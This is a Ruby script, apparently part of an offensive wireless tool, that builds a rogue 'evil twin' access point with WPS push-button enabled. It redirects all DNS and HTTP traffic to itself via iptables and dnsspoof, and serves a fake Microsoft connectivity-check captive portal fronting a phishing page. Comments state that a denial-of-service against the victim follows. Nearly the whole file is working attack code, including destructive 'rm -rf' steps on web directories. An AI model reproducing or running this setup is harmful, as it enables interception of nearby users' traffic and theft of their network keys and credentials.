#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'
require 'monitor'
require 'shellwords'
require './state'
require './dos'







class Rogue
 def self.hostapdNormal
load 'check.rb'
      `rm -rf /etc/dhcp/dhcpd.conf`
      `touch /etc/dhcp/dhcpd.conf`
      `touch /tmp/hostapd.psk`
      `touch /tmp/hostapd.conf`
sleep 1
`echo encryptedhostapd > /tmp/hostbase-1.3ES/attack.txt`
`cat <<-EOF > /tmp/hostapd.conf
interface=wlan0
driver=nl80211
ssid=#{$ssid} 
ieee8021x=1
wpa=2
hw_mode=g
ieee80211n=1
channel=#{$canal}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=12345678
wpa_psk_file=/tmp/hostapd.psk
ctrl_interface=/var/run/hostapd
eap_server=1
wps_state=2
ap_setup_locked=0
uuid=87654321-9abc-def0-1234-56789abc0000
wps_pin_requests=/var/run/hostapd.pin-req
device_name=Wireless AP
manufacturer=Company
model_name=WAP
model_number=123
serial_number=12345
device_type=6-0050F204-1
os_version=01020300
config_methods=label display push_button keypad
pbc_in_m1=1
friendly_name=WPS Access Point
EOF`
sleep 2
`cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 175.0.0.0 netmask 255.255.255.0 {
interface wlan0;
range 175.0.0.2 175.0.0.10;
option routers 175.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 175.0.0.1;
allow unknown-clients;
}
EOF`
sleep 1
`cat <<-EOF > /tmp/dns.conf
10.0.0.1 *.*
EOF`
sleep 1   
        system "hostapd /tmp/hostapd.conf > /tmp/hostbase-1.3ES/hostapd.txt &> /dev/null &"
sleep 5
hostapdcli = Thread.new do
  while true
    system "xterm -e hostapd_cli wps_pbc"   # On lance hostapd_cli wps_pbc en tant que thread
sleep(120)     # Temps avant la relance de la commande
  end
end
Setup.hostapdInit # on appelle la fonction dont on a besoin
sleep(5000000)        
       # Lancement de hostapd_cli a rajouter ici
       # Appel du script rogueinit et/ou de la méthode correspondante
       # Voir nohup ou xterm -e
   end

      



class Setup
def self.hostapdInit
puts "\e[1;94m[*] Configuracion del falso AP...\e[0m"
`ifconfig wlan0 up`
`sudo sysctl net.ipv4.ip_forward=1`
`ifconfig wlan0 175.0.0.1 netmask 255.255.255.0`
`ifconfig wlan0 mtu 1400`
`iptables --flush`
`iptables --table nat --flush`
`iptables --delete-chain`
`iptables --table nat --delete-chain`
sleep 2;
`route add -net 175.0.0.0 netmask 255.255.255.0 gw 175.0.0.1 &> /dev/null`
`iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 175.0.0.1`
`iptables -P FORWARD ACCEPT`
`iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 175.0.0.1:80`
sleep 1
`echo > /var/lib/dhcp/dhcpd.leases`
sleep 1
piddhcp = spawn('dhcpd -d /etc/dhcpd.conf')
sleep 3
piddnsspoofbis = spawn('dnsspoof -i wlan0 &')
sleep 1
page = File.open("page.txt").readlines.each do |page|
  puts page
$page = page.chomp
puts "\e[1;94m[*] Configuracion del systemo de hotspot...\e[0m"
Dir.chdir '/var/www'
sleep 1
`rm -rf *`
`cat <<-EOF > ncsi.txt
Microsoft NCSI
EOF`
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
`mkdir generate_204`
sleep 1
Dir.chdir '/var/www/generate_204'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`mkdir msftconnecttest`
sleep 1
`mkdir msftnci`
sleep 1
Dir.chdir '/var/www/msftnci'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
Dir.chdir '/var/www'
sleep 1
`mkdir redirect`
sleep 1
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
Dir.chdir '/var/www/redirect'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
`cp -R /etc/#{$page}/* /var/www/msftconnecttest/`
sleep 3;
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$page}.php index.php`
`chown -R root:www-data /var/www/*`
sleep 1
Dir.chdir '/var/www/msftconnecttest/shout'
sleep 1
`chown -R root:www-data /var/www/msftconnecttest/shout/chat.txt`
`chmod 764 /var/www/msftconnecttest/shout/chat.txt`
`chmod  777 *`
Dir.chdir '/var/www/msftconnecttest'
sleep 1
cle = "cle.txt"
if File.exist?("cle.txt")
`chmod 777 *`
`chown -R root:www-data /var/www/msftconnecttest/cle.txt`
`chmod 764 /var/www/msftconnecttest/cle.txt`
`service apache2 restart`
sleep 4
puts "\e[1;32m[*] Falso AP iniciado... préparacion de la DoS...\e[0m"
Dir.chdir '/tmp/hostbase-1.3ES'
sleep 1
Choice.attaque # Lancement de la DoS ici et du code qui attend la victime
else
`chmod 777 *`
`service apache2 restart`
sleep 4
puts "\e[1;32m[*] Falso AP iniciado... préparacion de la DoS...\e[0m"
Dir.chdir '/tmp/hostbase-1.3ES'
sleep 1 
Choice.attaque # Lancement de la DoS ici et du code qui attend la victime
end
end
end
end
end
